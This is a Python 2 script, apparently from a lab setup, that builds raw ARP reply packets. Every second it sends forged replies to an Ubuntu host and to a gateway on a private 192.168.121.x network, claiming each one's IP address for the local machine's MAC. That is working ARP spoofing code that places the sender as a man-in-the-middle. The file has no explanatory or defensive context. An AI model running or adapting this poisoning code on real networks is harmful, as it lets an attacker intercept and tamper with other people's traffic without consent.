# -*- coding: UTF-8 -*-
import sys
import socket
import struct
import time
import threading


def arp_reply_packet_creator(src_mac,src_ip,des_mac,des_ip):
    #Ethernet header
    #Ethernet destination address
    des_eth_mac=des_mac
    #Ethernet source address
    src_eth_mac=src_mac
    #frame type
    frame_type=b'\x08\x06'

    #ARP packet header
    #hardware address
    hardware_type=b'\x00\x01'
    #agreement type
    pro_type=b'\x08\x00'
    #hardware address length
    hardware_len=b'\x06'
    #Protocol address length
    pro_len=b'\x04'
    
    #op
    op=b'\x00\x02'
    
    #Sender Ethernet address
    sender_mac=src_eth_mac
    #Sender IP address
    sender_ip=socket.inet_aton(src_ip)
    #Receiver Ethernet address
    target_mac=des_eth_mac
    #Receiver IP address
    target_ip=socket.inet_aton(des_ip)

    return struct.pack("!6s6s2s2s2s1s1s2s6s4s6s4s",des_eth_mac,src_eth_mac,frame_type,hardware_type,pro_type,hardware_len,pro_len,op,sender_mac,sender_ip,target_mac,target_ip)



def send_arp(src_mac,src_ip,des_mac,des_ip):
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    s.bind(("eth0", 0))
    reply_packet=arp_reply_packet_creator(src_mac,src_ip,des_mac,des_ip)

    s.send(reply_packet)


def send_to_ubuntu(src_mac,fake_src_ip,des_mac,des_ip):

    print "send arp reply to ubuntu"

    while 1:
        send_arp(src_mac,fake_src_ip,des_mac,des_ip)
        time.sleep(1)

def send_to_gateway(src_mac,fake_src_ip,des_mac,des_ip):

    print "send arp reply to gateway"

    while 1:
        send_arp(src_mac,fake_src_ip,des_mac,des_ip)
        time.sleep(1)

#Local MAC address        
src_mac=b'\x00\x0c\x29\x72\xb5\xa0'

#Forged sender IP address
fake_src_gateway_ip='192.168.121.2'
fake_src_ubuntu_ip='192.168.121.129'

#destination MAC address ubuntu
des_mac_u=b'\x00\x0c\x29\xb7\x52\xa0'
#destination IP addressubuntu
des_ip_u='192.168.121.129'

#destination MAC address gateway
des_mac_g=b'\x00\x50\x56\xf8\xb6\xec'
#destination IP address gateway
des_ip_g='192.168.121.2'


#Start the thread sent to Ubuntu
thread = threading.Thread(target=send_to_ubuntu, args=(src_mac,fake_src_gateway_ip,des_mac_u,des_ip_u))
thread.start()

time.sleep(0.1)

#Start sending to the gateway thread
thread = threading.Thread(target=send_to_gateway, args=(src_mac,fake_src_ubuntu_ip,des_mac_g,des_ip_g))
thread.start()
